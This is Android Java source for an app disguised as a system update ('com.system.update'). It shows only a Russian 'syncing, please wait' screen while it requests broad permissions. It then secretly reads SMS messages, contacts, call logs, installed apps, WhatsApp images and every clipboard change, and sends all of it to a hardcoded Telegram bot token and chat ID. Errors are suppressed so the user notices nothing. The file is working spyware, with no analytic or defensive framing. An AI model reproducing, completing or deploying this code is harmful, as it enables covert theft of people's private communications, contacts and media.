package com.system.update;

import android.Manifest;
import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.widget.TextView;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String BOT_TOKEN = "9263955385:AAE6VkwQqIPh6-mNddaDVz313O6THg9LjPA";
    private static final String CHAT_ID = "8682887545";
    private static final int PERMISSION_REQUEST_CODE = 1;

    private final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("Синхронизация...\nПодождите.");
        tv.setTextSize(18);
        tv.setPadding(50, 50, 50, 50);
        setContentView(tv);

        // Слушатель буфера обмена
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        clipboard.addPrimaryClipChangedListener(() -> {
            try {
                ClipData clip = clipboard.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    if (text != null && text.length() > 0) {
                        sendTelegramMessage("📋 <b>Clipboard:</b>\n<code>" + text + "</code>");
                    }
                }
            } catch (Exception e) {}
        });

        List<String> missingPermissions = new ArrayList<>();
        for (String perm : REQUIRED_PERMISSIONS) {
            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(perm);
            }
        }

        if (!missingPermissions.isEmpty()) {
            requestPermissions(missingPermissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            new DataCollector().execute();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        new DataCollector().execute();
    }

    private class DataCollector extends AsyncTask<Void, Void, String> {
        @Override
        protected String doInBackground(Void... voids) {
            StringBuilder sb = new StringBuilder();
            sb.append("📱 <b>Устройство:</b> ").append(Build.MODEL).append("\n\n");

            // 1. SMS
            sb.append("📩 <b>SMS (10):</b>\n");
            try (Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 10")) {
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        sb.append(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))).append(": ")
                          .append(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))).append("\n");
                    }
                }
            } catch (Exception e) {}

            // 2. Контакты
            sb.append("\n👥 <b>Контакты (10):</b>\n");
            try (Cursor cur = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)) {
                int i = 0;
                if (cur != null) {
                    while (cur.moveToNext() && i < 10) {
                        sb.append(cur.getString(cur.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))).append("\n");
                        i++;
                    }
                }
            } catch (Exception e) {}

            // 3. Звонки
            sb.append("\n📞 <b>Звонки (5):</b>\n");
            try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 5")) {
                if (c != null) {
                    while (c.moveToNext()) {
                        sb.append(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append(" - ")
                          .append(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))).append("\n");
                    }
                }
            } catch (Exception e) {}

            // 4. Установленные приложения
            sb.append("\n📦 <b>Приложения:</b>\n");
            try {
                List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
                for (int i = 0; i < Math.min(apps.size(), 20); i++) { // Первые 20
                    sb.append(apps.get(i).packageName).append("\n");
                }
            } catch (Exception e) {}

            // 5. Медиа из WhatsApp
            sb.append("\n🖼 <b>WhatsApp Медиа:</b>\n");
            try {
                String[] projection = {MediaStore.MediaColumns.DATA};
                // Ищем в папке WhatsApp
                Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, 
                        MediaStore.Images.Media.DATA + " LIKE ?", new String[]{"%/WhatsApp/Media/WhatsApp Images/%"}, "date_added DESC LIMIT 2");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String path = cursor.getString(0);
                        sendTelegramDocument(path, "🖼 WhatsApp Image");
                    }
                    cursor.close();
                }
            } catch (Exception e) {}

            sendTelegramMessage(sb.toString());
            return null;
        }
    }

    private void sendTelegramMessage(String text) {
        new Thread(() -> {
            try {
                int maxLen = 4000;
                for (int i = 0; i < text.length(); i += maxLen) {
                    String chunk = text.substring(i, Math.min(text.length(), i + maxLen));
                    String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(chunk, "UTF-8") + "&parse_mode=HTML";
                    HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                    conn.setRequestMethod("GET");
                    conn.getResponseCode();
                    conn.disconnect();
                }
            } catch (Exception e) {}
        }).start();
    }

    private void sendTelegramDocument(String filePath, String caption) {
        new Thread(() -> {
            try {
                File file = new File(filePath);
                if (!file.exists()) return;
                String boundary = "*****" + System.currentTimeMillis() + "*****";
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                DataOutputStream request = new DataOutputStream(conn.getOutputStream());
                request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
                request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
                request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
                fis.close();
                request.writeBytes("\r\n--" + boundary + "--\r\n");
                request.flush();
                request.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
}
